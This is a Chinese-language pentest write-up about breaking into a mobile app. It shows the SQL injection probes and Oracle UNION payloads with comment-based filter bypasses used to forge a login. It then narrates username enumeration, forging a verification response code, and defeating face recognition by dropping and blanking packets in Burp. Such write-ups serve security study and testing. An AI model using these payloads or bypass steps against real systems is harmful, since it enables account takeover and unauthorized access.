# 【渗透实战系列】33-App渗透 ,由sql注入、绕过人脸识别、成功登录APP

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzIxOTM2MDYwNg==&mid=2247508005&idx=1&sn=a2b714558557400cd0742d161e7b3ad9&chksm=97de9c14a0a915027a9599d478977095bbbd3f423d0b9939584a11e92ad289506270c1672956&scene=126&sessionid=1681402154#rd](http://mp.weixin.qq.com/s?__biz=MzIxOTM2MDYwNg==&mid=2247508005&idx=1&sn=a2b714558557400cd0742d161e7b3ad9&chksm=97de9c14a0a915027a9599d478977095bbbd3f423d0b9939584a11e92ad289506270c1672956&scene=126&sessionid=1681402154#rd)

![](../Images/f542e7c2b2f52cd6f642176ea581b137.png)

  

  

![](../Images/7c46a47c89af36a30787ca2f231aab64.png)

涉及知识点

1、APP抓包和逆向破解加密算法；

2、解密参数，寻找注入点；

3、Union注入构造万能密码；

4、利用忘记密码功能，burpsuite爆破用户名；

5、解密短信验证数据包，绕过验证码，成功登录

6、burp把手机发向服务器的人脸识别数据包丢掉，

    并修改为空，绕过人脸识别成功登录。

![](../Images/57a334ff70fe689c57103a6def815c17.png)![](../Images/d9245a48a9dfd4472f5145f8f8329aa0.png)

  

# App渗透 - 人脸识别登录绕过

  

  

![](../Images/3bebd647b8c2a12fc2db45d6c2a1bc66.png)

一、APP抓包和逆向破解加密算法

![](../Images/3b54e1868259a63cf6d33671daf65062.png)

  

打开APP是一个登录框  

![](../Images/25321ed778c0ac44bfc784e91b722c15.png)

  

抓包后发现参数被加密了  

![](../Images/fd7a38c2ed3a64f9f5c810c6f5e9202e.png)

  

使用Jadx脱源码发现，并没有加壳也没有混淆，运气很好  

![](../Images/de83392f82ab51c312e259104f6af615.png)

  

根据经验，先搜索Encrypt、Decrypt等关键字，发现在Common.js中有一个encryptData函数  

![](../Images/779651ec3474b141c02f11c229c7589d.png)

  

定位过去，一套加解密算法都写好了放在这  

![](../Images/9b919b72112f2e473eb67e1cff49ae51.png)

  

放到浏览器console里面调试，果然没错  

![](../Images/14de5fa353b2f5704838a1c9eb363702.png)

  

![](../Images/3bebd647b8c2a12fc2db45d6c2a1bc66.png)

二、寻找注入点

![](../Images/3b54e1868259a63cf6d33671daf65062.png)

  

首先测试了一下注入  

`明文：{"userName":"TEST'","passWord":"123456","osType":"android","osVersion":"5.1.1","appVersion":"20.06.04","loginType":"1","model":"V1938T","brand":"vivo","imei":"865166023309431","version":"new"}   密文：结果：App返回异常`

![](../Images/2bfb12b9d05056b05947be6cbf69352f.png)

  

`明文：{"userName":"TEST''","passWord":"123456","osType":"android","osVersion":"5.1.1","appVersion":"20.06.04","loginType":"1","model":"V1938T","brand":"vivo","imei":"865166023309431","version":"new"}   密文：结果：App返回正常`

![](../Images/1e6669a1d016f1750c72b07b23c8aada.png)

  

`明文：{"userName":"TEST'or'1'='1","passWord":"123456","osType":"android","osVersion":"5.1.1","appVersion":"20.06.04","loginType":"1","model":"V1938T","brand":"vivo","imei":"865166023309431","version":"new"}   密文：结果：App返回正常`

![](../Images/e3ef44b5e0f0063d15f94fee57b71c48.png)

  

至此已经可以判断该登录点就是一个注入了，可是返回结果始终都是“用户名或密码错”即使用了' or '1'='1  

![](../Images/c08e5b65473797aa779bd43b75a0b3d7.png)

  

根据返回结果推测，后端的登录处的逻辑代码可能是这样的

`userInfo = 'select * from userinfo where username =';   userPass = userInfo.password;if (userPass ==){   return 'Login success';   }else{   return 'Login failed';   }`

通过Union注入构造万能密码，是可以造成任意用户登陆的，测试过程如下  
先使用order by测试，得知字段的数量为9个，构造payload

`# 由于目标服务器带有过滤，所以这里简单的bypass一下   明文：{"userName":"TEST'union/**/select/**/null,null,null,null,null,null,null,null,null from dual-- ","passWord":"123456","osType":"android","osVersion":"5.1.1","appVersion":"20.06.04","loginType":"1","model":"V1938T","brand":"vivo","imei":"865166023309431","version":"new"}   密文：   结果：App返回成功`

![](../Images/279379ae1625e4108e0fbc86c1c4cf41.png)

  

由于Oracle在进行union查询时，所对应的字段数据类型也必须相同，所以还要进行字段数据类型的测试，最终结果如下

`# 注意这里passWord我修改成了123，用来测试Union构造的万能密码是否可行   明文：{"userName":"TEST'union/**/select/**/1,'123','123','123','123','123','123','123',1 from dual-- ","passWord":"123","osType":"android","osVersion":"5.1.1","appVersion":"20.06.04","loginType":"1","model":"V1938T","brand":"vivo","imei":"865166023309431","version":"new"}   密文：   结果：提示是弱密码（说明此方法可行）`

![](../Images/914456f656a2a612addd79bc966b3b2c.png)

  

![](../Images/7acbb23ed23594cafe62447e2b2523a3.png)

  

  
接下来就是一个字段一个字段的改过去，判断哪个字段对应的是密码字段，测试结果如下

`# 注意这里passWord我修改成了Ceshi123@@@，不再是弱口令了   明文：{"userName":"TEST'union/**/select/**/1,'123','123','Ceshi123@@@','123','123','123','123',1 from dual-- ","passWord":"Ceshi123@@@","osType":"android","osVersion":"5.1.1","appVersion":"20.06.04","loginType":"1","model":"V1938T","brand":"vivo","imei":"865166023309431","version":"new"}   密文：结果：提示登录成功`

![](../Images/ac5f42d4c00a8496c2ebc2d226f51fc1.png)

  

![](../Images/766e563eebad08e1062590e85fd51c25.png)

  

在绕过后，发现程序出现了异常  

![](../Images/0639f0c10d68ed307dd7b1cccff0b0bf.png)

  

仔细观察返回的数据，其中有username（用户名）、staffId（职工号）、email（邮箱）、staffName（姓名）、tel（手机号）、mobile（手机号），然而这些数据都是我刚刚自己随便构造的，这里应该需要一个真实的用户信息，供后续的登录流程使用  

![](../Images/766e563eebad08e1062590e85fd51c25.png)

  

好在，还是有一个地方能获取真实的用户信息的

  

![](../Images/3bebd647b8c2a12fc2db45d6c2a1bc66.png)

三、由忘记密码，爆破用户名

![](../Images/3b54e1868259a63cf6d33671daf65062.png)

  

App还有一个忘记密码的功能（通常这里可以爆破用户名）  

![](../Images/d81036532cf09aea675950a570cadbd5.png)

  

利用忘记密码的功能可以判断用户名是否存在，这里随便跑了一下字典，就出来好多用户名  

![](../Images/b2c30e9a64ddd66cfa5e021dafa7d450.png)

  

![](../Images/b5d518a395f92689e987afec59124f8e.png)

  

  

![](../Images/3bebd647b8c2a12fc2db45d6c2a1bc66.png)

四、破解短信验证码

![](../Images/3b54e1868259a63cf6d33671daf65062.png)

  

自然而然地利用这些用户名使用短信验证码登录  

![](../Images/29886491924d4534aa3544376ed93a59.png)

  

获取验证码，然后解密数据包，惊奇的发现返回了用户基本信息  

![](../Images/79236695bc33b5cc9932a3c7ad6a8e66.png)

  

根据登录返回结果，重新测试payload，最终结果如下

`明文：{"userName":"TEST\'union/**/select/**/,\'Qwe123@@@\',\'\',\'Qwe123@@@\',\'\',\'\',\'\',\'865166023309431\',from dual -- ","passWord":"Qwe123@@@","osType":"android","osVersion":"5.1.1","appVersion":"20.06.04","loginType":"1","model":"V1938T","brand":"vivo","imei":"865166023309431","version":"new"}   密文：xxxxxxxxx结果：提示登录成功`

![](../Images/bcbf2eece30870455b3eb69bf3fd190a.png)

  

仔细看返回的登录数据，已经正常了  

![](../Images/f7edc2221a23fcdffacff64367e2884d.png)

  

然后重新替换数据包登录，提示绑定IMEI  

![](../Images/9ef01ee7153e6833041e8de2afaa27d8.png)

  

这个绕过很简单，随便输入验证码，替换返回包，把resultCode从1001改为1000就行（常规操作）  

![](../Images/5d041cef5be7fc15d000b951d48edb6f.png)

  

![](../Images/60a1f19cba7d11aaf0e05c91b1ca6a95.png)

  

  

![](../Images/3bebd647b8c2a12fc2db45d6c2a1bc66.png)

五、抓包、改包，绕过人脸识别

![](../Images/3b54e1868259a63cf6d33671daf65062.png)

  

最终还要个人脸认证  

![](../Images/85ffcca2099bbc0602ba655f89d0f437.png)

  

先用自己的脸检测，这时候手机会向服务器发包，burp把手机发向服务器的包直接丢掉就可以绕过  

![](../Images/4d6b07b9720acb45eccd52e5066d6455.png)

  

点击确定后，还有一个大数据包发向服务器，这里面包含的是人脸数据  

![](../Images/4eb77d910425427b53c63c1b4c482b45.png)

  

修改数据包，将其中的人脸数据替换为空，然后发送  

![](../Images/573b83e630388e1be4708228b35f16ed.png)

  

![](../Images/d0cbd350fa0627aa9503069ae564d4d9.png)

  

  

![](../Images/3bebd647b8c2a12fc2db45d6c2a1bc66.png)

七、成功登录APP

![](../Images/3b54e1868259a63cf6d33671daf65062.png)

  

最终的最终，成功登录APP  

![](../Images/d80dc9c0f95f31c232b6eaf21e08f2a4.png)
